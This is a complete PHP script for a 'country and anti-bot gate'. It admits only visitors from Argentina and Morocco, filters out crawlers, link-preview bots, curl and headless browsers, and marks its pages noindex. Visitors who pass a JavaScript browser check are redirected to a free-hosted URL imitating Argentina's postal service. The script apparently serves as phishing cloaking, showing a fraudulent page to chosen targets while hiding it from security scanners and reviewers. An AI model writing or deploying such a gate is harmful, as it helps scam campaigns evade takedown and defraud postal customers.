<?php
declare(strict_types=1);

/*
 * ONE-FILE COUNTRY + BASIC ANTI-BOT GATE
 * Allowed countries: Argentina (AR) and Morocco (MA)
 * Destination: set DESTINATION_URL below.
 *
 * Important: put the domain behind Cloudflare, enable IP Geolocation,
 * and block direct access to the origin server so CF-* headers cannot be spoofed.
 */

// CHANGE ONLY THIS LINE: paste your complete HTTPS link between the quotes.
const DESTINATION_URL = 'https://correoargentina.tiiny.io';
const VERIFIED_SECONDS = 1800;
const RATE_LIMIT_MAX = 30;
const RATE_LIMIT_WINDOW = 300;

$allowedCountries = ['AR', 'MA'];

function deny_request(int $status = 403): void
{
    http_response_code($status);
    header('Content-Type: text/html; charset=UTF-8');
    header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
    header('X-Robots-Tag: noindex, nofollow, noarchive');
    header('X-Content-Type-Options: nosniff');
    header('Referrer-Policy: no-referrer');
    header("Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'; base-uri 'none'; frame-ancestors 'none'");

    $title = $status === 429 ? 'Too many requests' : 'Access unavailable';
    echo '<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">';
    echo '<title>' . $title . '</title><style>body{margin:0;min-height:100vh;display:grid;place-items:center;background:#f3f5f7;color:#17202a;font:16px system-ui}.box{padding:2rem;border:1px solid #dce2e8;border-radius:14px;background:#fff}h1{margin:0;font-size:1.35rem}</style></head>';
    echo '<body><main class="box"><h1>' . $title . '</h1></main></body></html>';
    exit;
}

function destination_url(): string
{
    $url = trim(DESTINATION_URL);
    $scheme = strtolower((string) parse_url($url, PHP_URL_SCHEME));
    $host = (string) parse_url($url, PHP_URL_HOST);

    if (filter_var($url, FILTER_VALIDATE_URL) === false || $scheme !== 'https' || $host === '') {
        deny_request(503);
    }

    return $url;
}

function client_ip(): string
{
    $ip = trim((string) ($_SERVER['HTTP_CF_CONNECTING_IP'] ?? ''));
    return filter_var($ip, FILTER_VALIDATE_IP) !== false ? $ip : '';
}

function cloudflare_request_is_valid(): bool
{
    $country = strtoupper(trim((string) ($_SERVER['HTTP_CF_IPCOUNTRY'] ?? '')));
    $ray = trim((string) ($_SERVER['HTTP_CF_RAY'] ?? ''));

    return preg_match('/^[A-Z]{2}$/', $country) === 1
        && preg_match('/^[a-zA-Z0-9-]{8,100}$/', $ray) === 1
        && client_ip() !== '';
}

function obvious_bot(): bool
{
    $method = strtoupper((string) ($_SERVER['REQUEST_METHOD'] ?? ''));
    if (!in_array($method, ['GET', 'POST'], true)) {
        return true;
    }

    $userAgent = trim((string) ($_SERVER['HTTP_USER_AGENT'] ?? ''));
    if ($userAgent === '' || strlen($userAgent) < 12 || strlen($userAgent) > 512) {
        return true;
    }

    $pattern = '/bot|crawler|spider|slurp|google-inspectiontool|facebookexternalhit|twitterbot|linkedinbot|discordbot|telegrambot|curl|wget|python-requests|python-urllib|go-http-client|libwww-perl|scrapy|headlesschrome|phantomjs|selenium|playwright|puppeteer|postmanruntime/i';
    if (preg_match($pattern, $userAgent) === 1) {
        return true;
    }

    $accept = strtolower((string) ($_SERVER['HTTP_ACCEPT'] ?? ''));
    return strpos($accept, 'text/html') === false;
}

function rate_limit_ok(string $ip): bool
{
    $directory = sys_get_temp_dir() . '/one-file-country-gate';
    if (!is_dir($directory) && !@mkdir($directory, 0700, true) && !is_dir($directory)) {
        return false;
    }

    $path = $directory . '/' . hash('sha256', $ip . '|country-gate-v1') . '.json';
    $handle = @fopen($path, 'c+');
    if ($handle === false || !flock($handle, LOCK_EX)) {
        if (is_resource($handle)) {
            fclose($handle);
        }
        return false;
    }

    rewind($handle);
    $raw = stream_get_contents($handle);
    $data = is_string($raw) && $raw !== '' ? json_decode($raw, true) : null;
    $now = time();

    if (!is_array($data)
        || !isset($data['start'], $data['count'])
        || ($now - (int) $data['start']) >= RATE_LIMIT_WINDOW
    ) {
        $data = ['start' => $now, 'count' => 0];
    }

    $data['count'] = (int) $data['count'] + 1;
    $allowed = $data['count'] <= RATE_LIMIT_MAX;

    rewind($handle);
    ftruncate($handle, 0);
    fwrite($handle, json_encode($data, JSON_UNESCAPED_SLASHES));
    fflush($handle);
    flock($handle, LOCK_UN);
    fclose($handle);
    @chmod($path, 0600);

    return $allowed;
}

function request_is_https(): bool
{
    if (!empty($_SERVER['HTTPS']) && strtolower((string) $_SERVER['HTTPS']) !== 'off') {
        return true;
    }

    $visitor = json_decode((string) ($_SERVER['HTTP_CF_VISITOR'] ?? ''), true);
    return is_array($visitor) && (($visitor['scheme'] ?? '') === 'https');
}

function start_secure_session(): void
{
    ini_set('session.use_strict_mode', '1');
    ini_set('session.use_only_cookies', '1');
    session_name('country_gate');
    session_set_cookie_params([
        'lifetime' => 0,
        'path' => '/',
        'domain' => '',
        'secure' => request_is_https(),
        'httponly' => true,
        'samesite' => 'Strict',
    ]);
    session_start();
}

header_remove('X-Powered-By');
header('X-Content-Type-Options: nosniff');
header('Referrer-Policy: no-referrer');
header('X-Frame-Options: DENY');
header('Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(), usb=()');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('X-Robots-Tag: noindex, nofollow, noarchive');

if (!cloudflare_request_is_valid() || obvious_bot()) {
    deny_request(403);
}

$country = strtoupper((string) $_SERVER['HTTP_CF_IPCOUNTRY']);
if (!in_array($country, $allowedCountries, true)) {
    deny_request(403);
}

$ip = client_ip();
if (!rate_limit_ok($ip)) {
    deny_request(429);
}

start_secure_session();
$userAgent = (string) $_SERVER['HTTP_USER_AGENT'];
$userAgentHash = hash('sha256', $userAgent);

$sessionValid = (int) ($_SESSION['verified_until'] ?? 0) >= time()
    && hash_equals((string) ($_SESSION['verified_country'] ?? ''), $country)
    && hash_equals((string) ($_SESSION['verified_ip'] ?? ''), $ip)
    && hash_equals((string) ($_SESSION['verified_ua'] ?? ''), $userAgentHash);

if ($sessionValid) {
    header('Location: ' . destination_url(), true, 303);
    exit;
}

$method = strtoupper((string) $_SERVER['REQUEST_METHOD']);
if ($method === 'POST') {
    $contentLength = (int) ($_SERVER['CONTENT_LENGTH'] ?? 0);
    $contentType = strtolower((string) ($_SERVER['CONTENT_TYPE'] ?? ''));

    if ($contentLength <= 0
        || $contentLength > 4096
        || strpos($contentType, 'application/x-www-form-urlencoded') !== 0
        || (string) ($_POST['website'] ?? '') !== ''
    ) {
        deny_request(403);
    }

    $nonce = (string) ($_POST['nonce'] ?? '');
    $issued = (string) ($_POST['issued'] ?? '');
    $proof = (string) ($_POST['proof'] ?? '');
    $storedNonce = (string) ($_SESSION['challenge_nonce'] ?? '');
    $storedIssued = (string) ($_SESSION['challenge_issued'] ?? '');
    $storedCountry = (string) ($_SESSION['challenge_country'] ?? '');

    $elapsed = microtime(true) - (float) $storedIssued;
    $expectedProof = hash('sha256', $storedNonce . '|' . $userAgent . '|' . $storedIssued);

    $challengeValid = $nonce !== ''
        && $issued !== ''
        && $proof !== ''
        && $storedNonce !== ''
        && hash_equals($storedNonce, $nonce)
        && hash_equals($storedIssued, $issued)
        && hash_equals($storedCountry, $country)
        && hash_equals($expectedProof, $proof)
        && $elapsed >= 1.0
        && $elapsed <= 120.0;

    unset($_SESSION['challenge_nonce'], $_SESSION['challenge_issued'], $_SESSION['challenge_country']);

    if (!$challengeValid) {
        deny_request(403);
    }

    session_regenerate_id(true);
    $_SESSION['verified_until'] = time() + VERIFIED_SECONDS;
    $_SESSION['verified_country'] = $country;
    $_SESSION['verified_ip'] = $ip;
    $_SESSION['verified_ua'] = $userAgentHash;

    header('Location: ' . destination_url(), true, 303);
    exit;
}

$nonce = bin2hex(random_bytes(24));
$issued = sprintf('%.6F', microtime(true));
$_SESSION['challenge_nonce'] = $nonce;
$_SESSION['challenge_issued'] = $issued;
$_SESSION['challenge_country'] = $country;

$cspNonce = base64_encode(random_bytes(18));
header("Content-Security-Policy: default-src 'none'; script-src 'nonce-{$cspNonce}'; style-src 'nonce-{$cspNonce}'; form-action 'self'; base-uri 'none'; frame-ancestors 'none'");
?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="robots" content="noindex,nofollow,noarchive">
    <title>Checking your browser</title>
    <style nonce="<?= htmlspecialchars($cspNonce, ENT_QUOTES, 'UTF-8') ?>">
        *{box-sizing:border-box}body{margin:0;min-height:100vh;display:grid;place-items:center;background:#f3f5f7;color:#17202a;font:16px/1.5 system-ui,sans-serif}.box{width:min(90%,32rem);padding:2rem;text-align:center;border:1px solid #dce2e8;border-radius:14px;background:#fff;box-shadow:0 14px 40px rgba(20,35,50,.08)}h1{margin:0 0 .5rem;font-size:1.4rem}p{margin:0;color:#5b6875}.dot{display:inline-block;width:.55rem;height:.55rem;margin:.8rem .15rem 0;border-radius:50%;background:#1769c2;animation:pulse 1s infinite alternate}.dot:nth-child(2){animation-delay:.2s}.dot:nth-child(3){animation-delay:.4s}.trap{position:absolute!important;left:-10000px!important;width:1px!important;height:1px!important;overflow:hidden!important}@keyframes pulse{to{opacity:.2;transform:translateY(-3px)}}
    </style>
</head>
<body>
<main class="box">
    <h1>Checking your browser</h1>
    <p>Please wait a moment.</p>
    <div aria-hidden="true"><span class="dot"></span><span class="dot"></span><span class="dot"></span></div>
    <form id="gate-form" method="post" action="index.php" autocomplete="off">
        <input type="hidden" name="nonce" value="<?= htmlspecialchars($nonce, ENT_QUOTES, 'UTF-8') ?>">
        <input type="hidden" name="issued" value="<?= htmlspecialchars($issued, ENT_QUOTES, 'UTF-8') ?>">
        <input type="hidden" id="proof" name="proof" value="">
        <label class="trap">Website <input type="text" name="website" tabindex="-1" autocomplete="off"></label>
    </form>
    <noscript>JavaScript is required.</noscript>
</main>
<script nonce="<?= htmlspecialchars($cspNonce, ENT_QUOTES, 'UTF-8') ?>">
(() => {
    const nonce = <?= json_encode($nonce, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT) ?>;
    const issued = <?= json_encode($issued, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT) ?>;

    setTimeout(async () => {
        try {
            const input = nonce + '|' + navigator.userAgent + '|' + issued;
            const digest = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(input));
            const proof = Array.from(new Uint8Array(digest), byte => byte.toString(16).padStart(2, '0')).join('');
            document.getElementById('proof').value = proof;
            document.getElementById('gate-form').submit();
        } catch (error) {
            document.querySelector('p').textContent = 'Verification could not be completed.';
        }
    }, 1200);
})();
</script>
</body>
</html>
